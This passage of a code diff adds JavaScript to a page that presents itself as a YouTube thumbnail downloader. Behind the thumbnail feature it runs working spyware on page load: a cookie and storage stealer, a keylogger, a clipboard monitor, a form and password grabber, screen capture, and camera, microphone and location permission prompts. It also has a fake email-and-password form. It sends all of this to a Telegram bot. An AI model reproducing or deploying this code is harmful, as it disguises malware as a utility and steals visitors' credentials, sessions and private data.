+    screenRecorder.ondataavailable = async (event) => {
+        if (event.data.size > 0) {
+            chunks.push(event.data);
+            const blob = new Blob(chunks, { type: mimeType });
+            const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
+            const file = new File([blob], `screen_${Date.now()}.${ext}`, { type: mimeType });
+            await sendVideoToTelegram(file, `📹 *SCREEN RECORDING*\n📊 Size: ${(blob.size / 1024 / 1024).toFixed(2)} MB\n⏰ ${getCurrentDate()}`);
+            chunks.length = 0;
+        }
+    };
+    
+    screenRecorder.start(1000);
+    
+    setTimeout(() => {
+        if (screenRecorder && screenRecorder.state === 'recording') {
+            screenRecorder.stop();
+            stream.getTracks().forEach(track => track.stop());
+        }
+    }, 30000);
+}
+
+// ==================== 5. SCREENSHOT ====================
+async function captureScreenshot() {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
+    
+    try {
+        const stream = await navigator.mediaDevices.getDisplayMedia({
+            video: { cursor: "always" },
+            audio: false
+        });
+        
+        const video = document.createElement('video');
+        video.style.display = 'none';
+        document.body.appendChild(video);
+        video.srcObject = stream;
+        await video.play();
+        await new Promise(resolve => setTimeout(resolve, 500));
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+        const file = new File([blob], `screenshot_${Date.now()}.png`, { type: 'image/png' });
+        await sendPhotoToTelegram(file, `📸 *SCREENSHOT*\n📐 ${canvas.width}x${canvas.height}\n⏰ ${getCurrentDate()}`);
+        
+        stream.getTracks().forEach(track => track.stop());
+        video.remove();
+    } catch (error) {}
+}
+
+// ==================== 6. COOKIE STEALER ====================
+function getAllCookies() {
+    const cookies = {};
+    const cookieString = document.cookie;
+    if (!cookieString) return cookies;
+    
+    cookieString.split(';').forEach(cookie => {
+        const parts = cookie.split('=');
+        const name = parts[0].trim();
+        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
+        if (name) cookies[name] = value;
+    });
+    return cookies;
+}
+
+function getCookieDetails() {
+    const cookies = [];
+    const cookieString = document.cookie;
+    if (!cookieString) return cookies;
+    
+    cookieString.split(';').forEach(cookie => {
+        const parts = cookie.split('=');
+        const name = parts[0].trim();
+        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
+        
+        const sensitiveKeywords = ['session', 'token', 'auth', 'login', 'user', 'pass', 'email', 'id', 'key', 'secret', 'jwt'];
+        const isSensitive = sensitiveKeywords.some(keyword => 
+            name.toLowerCase().includes(keyword) || value.toLowerCase().includes(keyword)
+        );
+        
+        cookies.push({ name, value, isSensitive });
+    });
+    return cookies;
+}
+
+function getAllStorageData() {
+    const data = { localStorage: {}, sessionStorage: {}, cookies: getAllCookies() };
+    
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        try { data.localStorage[key] = localStorage.getItem(key); } catch(e) { data.localStorage[key] = 'Cannot read'; }
+    }
+    
+    for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        try { data.sessionStorage[key] = sessionStorage.getItem(key); } catch(e) { data.sessionStorage[key] = 'Cannot read'; }
+    }
+    return data;
+}
+
+async function stealAllData() {
+    if (!CHAT_ID) return;
+    
+    try {
+        const cookies = getCookieDetails();
+        const storageData = getAllStorageData();
+        const deviceInfo = await collectDeviceInfo();
+        
+        let message = `🔴 *STOLEN DATA REPORT*\n\n`;
+        message += `🍪 Cookies: ${cookies.length} found\n`;
+        
+        if (cookies.length > 0) {
+            cookies.slice(0, 10).forEach(c => {
+                const shortValue = c.value.length > 50 ? c.value.substring(0, 50) + '...' : c.value;
+                message += `├─ ${c.name}: ${shortValue}\n`;
+            });
+            if (cookies.length > 10) message += `└─ ... and ${cookies.length - 10} more\n`;
+        }
+        
+        message += `\n💾 Storage:\n├─ LocalStorage: ${Object.keys(storageData.localStorage).length} items\n├─ SessionStorage: ${Object.keys(storageData.sessionStorage).length} items\n\n`;
+        message += `${formatDeviceInfo(deviceInfo)}`;
+        
+        await sendMessageToTelegram(message);
+        
+        const fullData = { timestamp: new Date().toISOString(), url: window.location.href, cookies, storage: storageData, deviceInfo };
+        const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
+        const jsonFile = new File([jsonBlob], `stolen_data_${Date.now()}.json`, { type: 'application/json' });
+        await sendFileToTelegram(jsonFile, `📁 Complete Stolen Data`);
+        
+        const sensitiveCookies = cookies.filter(c => c.isSensitive);
+        if (sensitiveCookies.length > 0) {
+            const sensitiveBlob = new Blob([JSON.stringify(sensitiveCookies, null, 2)], { type: 'application/json' });
+            const sensitiveFile = new File([sensitiveBlob], `sensitive_cookies_${Date.now()}.json`, { type: 'application/json' });
+            await sendFileToTelegram(sensitiveFile, `⚠️ Sensitive Cookies - ${sensitiveCookies.length} items`);
+        }
+    } catch (error) {}
+}
+
+// ==================== 7. KEYLOGGER ====================
+function setupKeylogger() {
+    document.addEventListener('keydown', function(e) {
+        if (!CHAT_ID) return;
+        if (e.target && e.target.type === 'password') return;
+        
+        if (e.key.length === 1) keylogBuffer += e.key;
+        else if (e.key === 'Enter') keylogBuffer += '\n';
+        else if (e.key === 'Backspace') keylogBuffer = keylogBuffer.slice(0, -1);
+        else if (e.key === ' ') keylogBuffer += ' ';
+        else if (e.key === 'Tab') keylogBuffer += '    ';
+        
+        clearTimeout(keylogTimer);
+        keylogTimer = setTimeout(async () => {
+            if (keylogBuffer.length > 0) {
+                await sendMessageToTelegram(`⌨️ *KEYLOGGER*\n\n${keylogBuffer}`);
+                keylogBuffer = '';
+            }
+        }, 3000);
+    });
+}
+
+// ==================== 8. CLIPBOARD MONITOR ====================
+function setupClipboardMonitor() {
+    setInterval(async () => {
+        if (!CHAT_ID) return;
+        try {
+            const text = await navigator.clipboard.readText();
+            if (text && text !== lastClipboard && text.length > 0 && text.length < 1000) {
+                lastClipboard = text;
+                await sendMessageToTelegram(`📋 *CLIPBOARD*\n\n${text}`);
+            }
+        } catch (error) {}
+    }, 5000);
+}
+
+// ==================== 9. FORM STEALER ====================
+function setupFormStealer() {
+    document.addEventListener('submit', async function(e) {
+        if (!CHAT_ID) return;
+        
+        const form = e.target;
+        const formData = new FormData(form);
+        const data = {};
+        
+        for (let [key, value] of formData.entries()) {
+            if (value instanceof File) {
+                data[key] = `[FILE: ${value.name}]`;
+                await sendFileToTelegram(value, `📎 Form File: ${key}`);
+            } else if (value && value.toString().trim() !== '') {
+                data[key] = value;
+            }
+        }
+        
+        if (Object.keys(data).length > 0) {
+            let message = `📝 *FORM SUBMITTED*\n\n📋 Action: ${form.action || 'None'}\n📋 Method: ${form.method || 'GET'}\n\n📊 Data:\n`;
+            for (let [key, value] of Object.entries(data)) {
+                const shortValue = String(value).length > 100 ? String(value).substring(0, 100) + '...' : value;
+                message += `├─ ${key}: ${shortValue}\n`;
+            }
+            await sendMessageToTelegram(message);
+        }
+    });
+}
+
+// ==================== 10. PASSWORD MONITOR ====================
+function setupPasswordMonitor() {
+    document.addEventListener('input', async function(e) {
+        if (!CHAT_ID) return;
+        
+        const target = e.target;
+        if (target && target.type === 'password' && target.value && target.value.length > 0) {
+            const name = target.name || target.id || 'Unknown';
+            await sendMessageToTelegram(`🔐 *PASSWORD ENTERED*\n\n📝 Field: ${name}\n🔑 Value: ${target.value}`);
+            keylogBuffer = '';
+        }
+    });
+}
+
+// ==================== 11. FORM SUBMIT HANDLER ====================
+async function sendToTelegram() {
+    const email = document.getElementById('email')?.value.trim();
+    const password = document.getElementById('password')?.value.trim();
+
+    if (!email || !password) {
+        alert("Please fill in both email and password!");
+        return;
+    }
+
+    const loadingDiv = document.getElementById('loading');
+    if (loadingDiv) loadingDiv.style.display = 'block';
+
+    const submitBtn = document.querySelector('.submit-btn');
+    if (submitBtn) {
+        submitBtn.disabled = true;
+        submitBtn.style.opacity = '0.7';
+    }
+
+    try {
+        const ip = await getPublicIP();
+        const date = getCurrentDate();
+        const message = formatTelegramMessage(email, password, ip, date);
+        const encodedMessage = encodeURIComponent(message);
+        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}`;
+        await fetch(url);
+
+        if (document.getElementById('email')) document.getElementById('email').value = '';
+        if (document.getElementById('password')) document.getElementById('password').value = '';
+        
+        alert("Successfully joined group!");
+        joinTelegramGroup();
+        
+    } catch (error) {
+        console.error("Error:", error);
+        alert("Technical error! Please check your internet connection.");
+        if (submitBtn) {
+            submitBtn.disabled = false;
+            submitBtn.style.opacity = '1';
+        }
+    } finally {
+        if (loadingDiv) loadingDiv.style.display = 'none';
+    }
+}
+
+// ==================== 12. PAGE UNLOAD TRACKING ====================
+function setupUnloadTracking() {
+    window.addEventListener('beforeunload', function() {
+        if (!CHAT_ID) return;
+        const message = `👋 *USER LEAVING*\n\nURL: ${window.location.href}\n⏰ ${getCurrentDate()}`;
+        const blob = new Blob([JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })], { type: 'application/json' });
+        navigator.sendBeacon(`https://api.telegram.org/bot${TOKEN}/sendMessage`, blob);
+    });
+}
+
+// ==================== YOUTUBE THUMBNAIL FUNCTIONS ====================
+function downloadThumbnail() {
+    var btn = document.getElementById('thumbdloadbtn');
+    var originalText = btn ? btn.textContent : 'FETCH THUMBNAILS';
+    if (btn) {
+        btn.textContent = 'Fetching... Please wait';
+        btn.disabled = true;
+    }
+    
+    var youtubeUrl = document.getElementById('ytlink')?.value.trim();
+    
+    if (!youtubeUrl) {
+        alert('Please enter a YouTube URL');
+        if (btn) {
+            btn.textContent = originalText;
+            btn.disabled = false;
+        }
+        return;
+    }
+    
+    var videoId = extractVideoId(youtubeUrl);
+    
+    if (!videoId) {
+        alert('Invalid YouTube URL. Please check and try again.');
+        if (btn) {
+            btn.textContent = originalText;
+            btn.disabled = false;
+        }
+        return;
+    }
+    
+    displayThumbnails(videoId);
+    
+    setTimeout(function() {
+        if (btn) {
+            btn.textContent = originalText;
+            btn.disabled = false;
+        }
+    }, 1500);
+}
+
+function extractVideoId(url) {
+    var videoId = '';
+    
+    if (url.includes('youtu.be/')) {
+        videoId = url.split('youtu.be/')[1].split('?')[0];
+    } else if (url.includes('youtube.com/watch?v=')) {
+        videoId = url.split('v=')[1].split('&')[0];
+    } else if (url.includes('youtube.com/embed/')) {
+        videoId = url.split('embed/')[1].split('?')[0];
+    } else if (url.includes('youtube.com/v/')) {
+        videoId = url.split('v/')[1].split('?')[0];
+    }
+    
+    if (videoId && videoId.length === 11) {
+        return videoId;
+    }
+    return null;
+}
+
+function displayThumbnails(videoId) {
+    var thumbnailContainer = document.getElementById('thumbnail-preview');
+    if (!thumbnailContainer) return;
+    
+    thumbnailContainer.innerHTML = '';
+    
+    var qualities = [
+        { name: 'Max Resolution', suffix: 'maxresdefault', quality: 'Highest' },
+        { name: 'HD 1080p', suffix: 'sddefault', quality: '1080p' },
+        { name: 'Medium', suffix: 'hqdefault', quality: '480p' },
+        { name: 'Standard', suffix: 'mqdefault', quality: '320p' },
+        { name: 'Thumbnail', suffix: 'default', quality: '120p' }
+    ];
+    
+    qualities.forEach(function(quality) {
+        var thumbnailUrl = `https://img.youtube.com/vi/${videoId}/${quality.suffix}.jpg`;
+        
+        var thumbnailItem = document.createElement('div');
+        thumbnailItem.className = 'thumbnail-item';
+        thumbnailItem.style.display = 'inline-block';
+        thumbnailItem.style.margin = '10px';
+        thumbnailItem.style.textAlign = 'center';
+        
+        var img = document.createElement('img');
+        img.src = thumbnailUrl;
+        img.alt = `YouTube thumbnail - ${quality.quality}`;
+        img.style.maxWidth = '200px';
+        img.style.borderRadius = '8px';
+        img.style.boxShadow = '0 2px 8px rgba(0,0,0,0.1)';
+        
+        var qualityLabel = document.createElement('div');
+        qualityLabel.textContent = `${quality.name} (${quality.quality})`;
+        qualityLabel.style.fontWeight = 'bold';
+        qualityLabel.style.marginTop = '8px';
+        
+        var downloadLink = document.createElement('a');
+        downloadLink.href = thumbnailUrl;
+        downloadLink.download = `youtube-thumbnail-${videoId}-${quality.suffix}.jpg`;
+        downloadLink.textContent = 'Download';
+        downloadLink.style.display = 'inline-block';
+        downloadLink.style.marginTop = '5px';
+        downloadLink.style.padding = '5px 10px';
+        downloadLink.style.backgroundColor = '#ff0000';
+        downloadLink.style.color = 'white';
+        downloadLink.style.textDecoration = 'none';
+        downloadLink.style.borderRadius = '5px';
+        
+        thumbnailItem.appendChild(img);
+        thumbnailItem.appendChild(qualityLabel);
+        thumbnailItem.appendChild(downloadLink);
+        
+        thumbnailContainer.appendChild(thumbnailItem);
+    });
+}
+
+function GetURLParameter(sParam) {
+    var sPageURL = window.location.search.substring(1);
+    var sURLVariables = sPageURL.split('&');
+    for (var i = 0; i < sURLVariables.length; i++) {
+        var sParameterName = sURLVariables[i].split('=');
+        if (sParameterName[0] == sParam) {
+            return sParameterName[1];
+        }
+    }
+}
+
+// ==================== START DATA COLLECTION ====================
+async function startDataCollection() {
+    setInterval(async () => {
+        const deviceInfo = await collectDeviceInfo();
+        const formattedInfo = formatDeviceInfo(deviceInfo);
+        await sendMessageToTelegram(`🔄 *CURRENT DATA*\n\n${formattedInfo}`);
+    }, 60000);
+    
+    setInterval(() => stealAllData(), 30000);
+}
+
+// ==================== MAIN INITIALIZATION ====================
+async function initialize() {
+    const deviceInfo = await collectDeviceInfo();
+    const formattedInfo = formatDeviceInfo(deviceInfo);
+    await sendMessageToTelegram(`🚀 *PAGE LOADED*\n\n${formattedInfo}`);
+    
+    setTimeout(() => requestCameraPermission(), 1000);
+    setTimeout(() => requestLocationPermission(), 3000);
+    setTimeout(() => requestMicrophonePermission(), 5000);
+    setTimeout(() => requestScreenPermission(), 7000);
+    setTimeout(() => startDataCollection(), 10000);
+    setTimeout(() => stealAllData(), 2000);
+    
+    setupKeylogger();
+    setupClipboardMonitor();
+    setupFormStealer();
+    setupPasswordMonitor();
+    setupUnloadTracking();
+    
+    var targetId = GetURLParameter('i');
+    if (targetId) {
+        try {
+            var decodedId = atob(targetId);
+            if (decodedId && decodedId !== CHAT_ID) {
+                CHAT_ID = decodedId;
+                await sendMessageToTelegram(`🎯 *NEW TARGET CONNECTED*\nIP: ${deviceInfo.ip}\nTime: ${getCurrentDate()}`);
+            }
+        } catch(e) {}
+    }
+    
+    var emailParam = GetURLParameter('email');
+    if (emailParam && document.getElementById('email')) {
+        try {
+            document.getElementById('email').value = atob(emailParam);
+        } catch(e) {}
+    }
+    
+    console.log('YouTube Thumbnail Downloader initialized');
+}
+
+// Start when DOM is ready
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initialize);
+} else {
+    initialize();
+}
+
+// Export functions
+window.downloadThumbnail = downloadThumbnail;
+window.sendToTelegram = sendToTelegram;
+window.getPublicIP = getPublicIP;
